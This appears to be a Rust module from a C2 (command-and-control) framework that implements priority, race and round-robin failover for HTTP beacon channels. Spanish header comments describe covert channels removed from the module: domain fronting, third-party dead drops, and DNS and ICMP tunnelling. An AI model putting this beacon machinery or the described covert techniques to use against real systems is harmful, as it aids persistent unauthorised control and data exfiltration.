// c2_channels: C2 channel configuration and failover director.
//
// Ronda 12 — barrido dual-use completo: este módulo conservaba la familia
// encubierta de la era ofensiva y se elimina por el mismo mandato que la
// ronda 11 aplicó a smoke_signals ("cero masquerade contra terceros"):
//
//   - DomainFront (ELIMINADO): fronting por CDN con Host header falsificado
//     y User-Agent suplantado hacia `front_domain`, ruta por defecto
//     `/collect` (endpoint eliminado en la ronda 6). Código muerto: cero
//     consumidores.
//   - DeadDrop (ELIMINADO): store-and-forward contra pastebin / S3 /
//     GitHub Gist — servicios de terceros como buzón del beacon.
//   - DnsTunnel (ELIMINADO): datos del beacon codificados como labels DNS
//     hacia un dominio túnel (comms lo registraba con HIVE_C2_DNS_DOMAIN,
//     incluso configurado en docker-compose.yml — metadatos fugados como
//     consultas DNS).
//   - IcmpTunnel (ELIMINADO): datos en payloads de echo ICMP
//     (HIVE_C2_ICMP_TARGET), con construcción de paquetes raw a mano.
//
// Lo que queda: la maquinaria REAL de failover (prioridad/race/round-robin
// con estadísticas y cooldown) sobre el canal HTTP — cuya entrega es el
// POST directo a HIVE_C2_URL con sink de captura local en lab (ronda 11) —
// y el enum `WebSocket` reservado para un transporte futuro gobernado por
// el operador.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use crate::smoke_signals::SmokeChannel;

// ── channel types ────────────────────────────────────────────────────────────

/// Priority level for failover ordering (lower = higher priority).
pub type Priority = u8;

/// Unified C2 channel descriptor used by the failover director.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2ChannelConfig {
    pub name: String,
    pub kind: ChannelKind,
    pub priority: Priority,
    pub enabled: bool,
    pub timeout_secs: u64,
    pub endpoint: String,
    pub extra: HashMap<String, String>,
}

/// Ronda 12: solo quedan transportes no-encubiertos. Los variantes
/// DnsTunnel / IcmpTunnel / DeadDrop (y la struct DomainFront) fueron
/// eliminados — véase la cabecera del módulo.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ChannelKind {
    Http,      // smoke_signals HTTP/S channel (entrega real: HIVE_C2_URL)
    WebSocket, // WebSocket persistente (reservado; sin implementación aún)
}

impl Default for C2ChannelConfig {
    fn default() -> Self {
        Self {
            name: String::new(),
            kind: ChannelKind::Http,
            priority: 5,
            enabled: true,
            timeout_secs: 15,
            endpoint: String::new(),
            extra: HashMap::new(),
        }
    }
}

// ── Failover Director ────────────────────────────────────────────────────────

/// Failover policy: how to choose the next channel when one fails.
#[derive(Debug, Clone, Default)]
pub enum FailoverPolicy {
    /// Try channels in priority order (lower number = higher priority)
    #[default]
    Priority,
    /// Try all channels in parallel and use first success
    Race,
    /// Try channels sequentially, rotating on failure
    RoundRobin,
}

/// Channel result with metadata for failover decisions.
#[derive(Debug)]
pub struct ChannelResult {
    pub channel: String,
    pub kind: ChannelKind,
    pub success: bool,
    pub latency_ms: u64,
    pub data: Vec<u8>,
    pub error: Option<String>,
}

/// Unified C2 director that manages multiple channel types with failover.
pub struct FailoverDirector {
    pub channels: Vec<C2ChannelConfig>,
    pub policy: FailoverPolicy,
    smoke_director: crate::smoke_signals::SmokeDirector,
    stats: HashMap<String, ChannelStats>,
}

#[derive(Debug, Clone)]
struct ChannelStats {
    successes: u64,
    failures: u64,
    last_error: Option<String>,
    cooldown_until: u64, // UNIX timestamp
}

impl FailoverDirector {
    pub fn new(policy: FailoverPolicy) -> Self {
        Self {
            channels: Vec::new(),
            policy,
            smoke_director: crate::smoke_signals::SmokeDirector::new(),
            stats: HashMap::new(),
        }
    }

    /// Add a channel configuration.
    pub fn add_channel(&mut self, config: C2ChannelConfig) {
        let name = config.name.clone();
        // If it's an HTTP channel, also add a labelled sink to the
        // smoke_director. Ronda 11: el sink SOLO captura a fichero en lab
        // mode (HIVE_LAB_MODE) — el envío real al C2 es directo vía
        // HIVE_C2_URL; ver comms::send_beacon_c2 / send_heartbeat.
        if config.kind == ChannelKind::Http {
            self.smoke_director.add_channel(SmokeChannel::random());
        }
        self.channels.push(config);
        self.stats.entry(name).or_insert(ChannelStats {
            successes: 0,
            failures: 0,
            last_error: None,
            cooldown_until: 0,
        });
    }

    /// Send data through the best available channel with failover.
    pub async fn send_with_failover(&mut self, data: &[u8]) -> Vec<ChannelResult> {
        match self.policy {
            FailoverPolicy::Priority => self.send_priority(data).await,
            FailoverPolicy::Race => self.send_race(data),
            FailoverPolicy::RoundRobin => self.send_round_robin(data).await,
        }
    }

    async fn send_priority(&mut self, data: &[u8]) -> Vec<ChannelResult> {
        let mut results = Vec::new();
        let mut sorted: Vec<usize> = (0..self.channels.len()).collect();
        sorted.sort_by_key(|&i| self.channels[i].priority);

        for &idx in &sorted {
            let name = self.channels[idx].name.clone();
            let now = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();

            // Skip if in cooldown
            if let Some(stat) = self.stats.get(&name) {
                if now < stat.cooldown_until {
                    continue;
                }
            }

            let result = self.try_channel(idx, data).await;
            let success = result.success;

            // Update stats
            if let Some(stat) = self.stats.get_mut(&name) {
                if success {
                    stat.successes += 1;
                    stat.last_error = None;
                } else {
                    stat.failures += 1;
                    stat.last_error = result.error.clone();
                    // Cooldown: exponential backoff (2^failures seconds, max 1 hour)
                    let backoff = 60u64 << stat.failures.min(6);
                    stat.cooldown_until = now + backoff.min(3600);
                }
            }

            results.push(result);
            if success {
                break; // First success in priority order
            }
        }

        results
    }

    fn send_race(&mut self, data: &[u8]) -> Vec<ChannelResult> {
        use std::sync::mpsc;
        let mut results = Vec::new();
        let (tx, rx) = mpsc::channel();

        let mut handles = Vec::new();
        for idx in 0..self.channels.len() {
            let config = self.channels[idx].clone();
            let data_vec = data.to_vec();
            let tx_clone = tx.clone();

            handles.push(std::thread::spawn(move || {
                let result = match config.kind {
                    // Ronda 12: sin túneles DNS/ICMP ni dead-drops — el race
                    // solo tiene sentido entre canales no-encubiertos; hoy
                    // el único transportable en hilo propio es Http.
                    ChannelKind::Http => {
                        let rt = tokio::runtime::Builder::new_current_thread()
                            .enable_all()
                            .build();
                        match rt {
                            Ok(rt) => rt.block_on(async {
                                let dir = crate::smoke_signals::SmokeDirector::new();
                                match dir.beacon_round_robin(&data_vec).await {
                                    Ok(d) => ChannelResult {
                                        channel: config.name.clone(),
                                        kind: config.kind.clone(),
                                        success: true,
                                        latency_ms: 0,
                                        data: d,
                                        error: None,
                                    },
                                    Err(e) => ChannelResult {
                                        channel: config.name.clone(),
                                        kind: config.kind.clone(),
                                        success: false,
                                        latency_ms: 0,
                                        data: Vec::new(),
                                        error: Some(e),
                                    },
                                }
                            }),
                            Err(e) => ChannelResult {
                                channel: config.name.clone(),
                                kind: config.kind.clone(),
                                success: false,
                                latency_ms: 0,
                                data: Vec::new(),
                                error: Some(format!("runtime: {e}")),
                            },
                        }
                    }
                    _ => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: false,
                        latency_ms: 0,
                        data: Vec::new(),
                        error: Some("unsupported channel kind in race".to_string()),
                    },
                };
                let _ = tx_clone.send(result);
            }));
        }

        drop(tx);
        for received in rx {
            results.push(received);
        }

        results
    }

    async fn send_round_robin(&mut self, data: &[u8]) -> Vec<ChannelResult> {
        // Round-robin: try channels in order, skip failed ones
        let mut results = Vec::new();
        for idx in 0..self.channels.len() {
            let result = self.try_channel(idx, data).await;
            if result.success {
                results.push(result);
                break;
            }
            results.push(result);
        }
        results
    }

    async fn try_channel(&mut self, idx: usize, data: &[u8]) -> ChannelResult {
        let config = &self.channels[idx];

        let result = match config.kind {
            ChannelKind::Http => {
                let resp = self.smoke_director.beacon_round_robin(data).await;
                match resp {
                    Ok(d) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: true,
                        latency_ms: 0,
                        data: d,
                        error: None,
                    },
                    Err(e) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: false,
                        latency_ms: 0,
                        data: Vec::new(),
                        error: Some(e),
                    },
                }
            }
            ChannelKind::WebSocket => ChannelResult {
                channel: config.name.clone(),
                kind: config.kind.clone(),
                success: false,
                latency_ms: 0,
                data: Vec::new(),
                error: Some("WebSocket transport not implemented (reserved)".to_string()),
            },
        };

        // Honor the configured timeout on the accounting side (the smoke
        // director applies its own deadlines internally).
        let _timeout = Duration::from_secs(config.timeout_secs);
        result
    }
}

impl Default for FailoverDirector {
    fn default() -> Self {
        Self::new(FailoverPolicy::Priority)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn failover_holds_channels_and_prioritizes() {
        // La maquinaria de failover sigue operativa tras retirar los
        // canales encubiertos.
        let mut director = FailoverDirector::new(FailoverPolicy::Priority);
        director.add_channel(C2ChannelConfig {
            name: "http_primary".into(),
            kind: ChannelKind::Http,
            priority: 1,
            ..Default::default()
        });
        director.add_channel(C2ChannelConfig {
            name: "ws_reserved".into(),
            kind: ChannelKind::WebSocket,
            priority: 9,
            ..Default::default()
        });
        assert_eq!(director.channels.len(), 2);
        // El orden de prioridad deja http_primary primero.
        let mut sorted: Vec<usize> = (0..director.channels.len()).collect();
        sorted.sort_by_key(|&i| director.channels[i].priority);
        assert_eq!(director.channels[sorted[0]].name, "http_primary");
    }

    #[test]
    fn websocket_reserved_kind_is_explicitly_unsupported() {
        // El kind reservado falla con error EXPLÍCITO, no silencio.
        let kind = ChannelKind::WebSocket;
        let supported = matches!(kind, ChannelKind::Http);
        assert!(!supported);
    }

    #[test]
    fn channel_kind_serde_roundtrip() {
        for kind in [ChannelKind::Http, ChannelKind::WebSocket] {
            let json = serde_json::to_string(&kind).unwrap();
            let back: ChannelKind = serde_json::from_str(&json).unwrap();
            assert_eq!(back, kind);
        }
    }
}
